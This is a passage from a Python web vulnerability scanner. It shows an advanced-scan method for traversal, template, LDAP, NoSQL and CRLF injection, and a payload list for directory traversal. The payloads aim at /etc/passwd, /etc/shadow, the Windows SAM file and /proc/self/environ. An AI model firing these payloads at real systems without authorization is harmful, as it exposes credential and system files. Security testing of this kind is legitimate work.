            print(f"{Colors.RED}[!] Failed to save results: {str(e)}{Colors.END}")
    
    def run_advanced_scan(self, target_url, vuln_types, email_config=None):
        """Run advanced vulnerability scan with additional tests"""
        
        # Add advanced vulnerability types
        advanced_scan_methods = {
            'directory_traversal': self.scan_directory_traversal,
            'ldap_injection': self.scan_ldap_injection,
            'ssti': self.scan_server_side_template_injection,
            'nosql_injection': self.scan_nosql_injection,
            'crlf_injection': self.scan_crlf_injection,
        }
        
        # Run the basic scan first
        success = self.run_scan(target_url, vuln_types, email_config)
        
        if success:
            # Run additional advanced tests
            endpoints = self.generate_endpoints(target_url)
            
            for vuln_type, scan_method in advanced_scan_methods.items():
                if vuln_type in vuln_types or 'all' in vuln_types:
                    scan_method(target_url, endpoints)
        
        return success

# Update the payloads with additional entries
VulnerabilityScanner.payloads.update({
    'directory_traversal': [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../var/log/apache2/access.log",
        "../../../proc/self/environ",
        "..\\..\\..\\boot.ini",
        "/../../../../etc/passwd",
        "\\..\\..\\..\\etc\\passwd",
        "%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32\\config\\sam"
    ]
})

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Unexpected error: {str(e)}{Colors.END}")
        sys.exit(1)